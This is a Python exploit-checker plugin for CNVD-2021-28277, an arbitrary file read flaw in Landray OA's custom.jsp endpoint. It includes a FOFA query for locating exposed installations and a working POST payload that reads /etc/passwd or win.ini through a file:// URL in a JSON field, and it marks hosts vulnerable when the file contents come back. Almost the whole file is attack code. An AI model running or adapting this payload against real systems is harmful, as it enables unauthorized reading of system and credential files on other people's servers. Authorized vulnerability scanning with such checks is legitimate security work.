#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/蓝凌OA/蓝凌OA custom.jsp 任意文件读取漏洞.html',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '蓝凌OA custom.jsp 任意文件读取 CNVD-2021-28277',

      'level'     :   'medium',

      'FOFA'      :   'app="Landray-OA系统"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/sys/ui/extend/varkind/custom.jsp'
  url1 = url + target
  data = r'var={"body":{"file":"file:///etc/passwd"}}'
  data2 = r'var={"body":{"file":"file:///c://windows/win.ini"}}'
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    resp=requests.post(url=url1,headers=headers,data=data2,timeout=5,verify=False)
    if resp.status_code == 200 and "for 16-bit app support" in resp.text:
      ret['ifbug'] = True
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret